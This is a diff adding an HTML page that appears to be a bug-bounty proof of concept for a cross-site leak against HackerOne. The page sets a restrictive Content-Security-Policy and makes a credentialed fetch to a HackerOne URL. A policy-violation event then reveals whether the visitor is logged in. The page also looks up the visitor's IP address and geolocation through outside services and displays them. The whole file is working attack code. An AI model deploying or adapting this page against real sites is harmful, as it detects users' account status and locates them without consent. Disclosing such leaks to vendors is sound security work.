@@ -1,0 +1,44 @@
+<!doctype html>
+<html>
+    <head>
+        <title>redirect xspoc h1</title>
+        <meta http-equiv="Content-Security-Policy" content="default-src 'unsafe-inline' https://hackerone.com https://www.cloudflare.com/ https://api.hackertarget.com/">
+    </head>
+    <body>
+        <div>
+            <pre><code id="result"></code>
+            <code id="whoisinfo"></code>
+            <code id="whoisinfo2"></code>
+            </pre>
+        </div>
+        <script>
+            var cloudFlare = "https://www.cloudflare.com/cdn-cgi/trace";
+            var whois = "https://api.hackertarget.com/geoip/?q="
+            var downloadBarSize = 49;
+            var getwhois = (ip) => {
+                fetch(whois+ip).then((resp) => {
+                    return resp.text();
+                }).then((data) => {
+                    document.getElementById("whoisinfo2").innerHTML = "<pre>"+data+"</pre>";
+                });
+            }
+            var getUserInfo = () => {
+                fetch(cloudFlare).then(
+                    (resp) => {
+                        return resp.text();
+                    }
+                ).then((data) => {
+                    document.getElementById("whoisinfo").innerHTML = "<pre>"+data+"</pre>";
+                    window.dataip = data.split("\n")[2].split("=")[1];
+                    getwhois(window.dataip);
+                });
+            }
+            document.addEventListener('securitypolicyviolation', (e) => {
+                console.log(e.blockedURI);
+                document.getElementById("result").innerHTML = "[+] You are logged into hackerone."
+                getUserInfo();
+            });
+            fetch("https://hackerone.com/last-month", {mode: 'no-cors',credentials: 'include'});
+        </script>
+    </body>
+</html>
